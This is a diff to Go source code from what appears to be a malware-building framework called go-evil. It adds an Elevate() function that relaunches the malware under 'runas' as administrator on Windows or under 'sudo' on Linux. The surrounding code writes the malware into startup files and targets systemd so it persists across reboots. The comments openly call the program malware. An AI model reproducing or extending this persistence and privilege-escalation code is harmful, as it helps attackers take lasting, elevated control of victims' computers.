@@ -5,20 +5,24 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"os/user"
 	"runtime"
+	"strings"
 
 	"github.com/s9rA16Bf4/go-evil/utility/converter"
-	user_var "github.com/s9rA16Bf4/go-evil/utility/variables/user"
+	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
+	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"gopkg.in/go-rillas/subprocess.v1"
 )
 
 func System_exit(status_lvl string) {
-	status_lvl = user_var.Check_if_variable(status_lvl)
+	status_lvl = run_time.Check_if_variable(status_lvl)
 	value := converter.String_to_int(status_lvl, "system.System_exit()")
 	os.Exit(value)
 }
 
 func System_out(msg string) {
-	msg = user_var.Check_if_variable(msg)
+	msg = run_time.Check_if_variable(msg)
 	fmt.Println(msg)
 }
 
@@ -31,7 +35,7 @@ func AddToStartup() {
 		for _, line := range target {
 			in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)
 			if err == nil {
-				in.WriteString("sudo ." + malware_name + " &")
+				in.WriteString("sudo ." + malware_name + " &") // & tells it to run in the background
 			}
 		}
 		// Target systemd
@@ -65,5 +69,30 @@ func AddToStartup() {
 func User_input() {
 	var input string
 	fmt.Scanln(&input)           // This takes the user input and puts the result into input
-	user_var.Set_variable(input) // Save the input
+	run_time.Set_variable(input) // Save the input
+}
+
+func Elevate() {
+	executable_location, _ := os.Getwd()  // The working directory
+	executable_location += os.Args[0][1:] // The malwares name
+
+	switch runtime.GOOS {
+	case "windows":
+		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+		if err != nil { // We currently are not administrators
+			executable_location = "runas /user:administrator " + executable_location
+			resp := subprocess.RunShell("", "", strings.Split(executable_location, " ")...)
+			run_time.Set_variable(resp.StdOut)
+		}
+	case "linux":
+		user, err := user.Current()
+		if err != nil {
+			notify.Error(err.Error(), "system.Elevate()")
+		}
+		if user.Username != "root" { // We are not root
+			executable_location = "sudo " + executable_location
+			resp := subprocess.RunShell("", "", strings.Split(executable_location, " ")...)
+			run_time.Set_variable(resp.StdOut)
+		}
+	}
 }
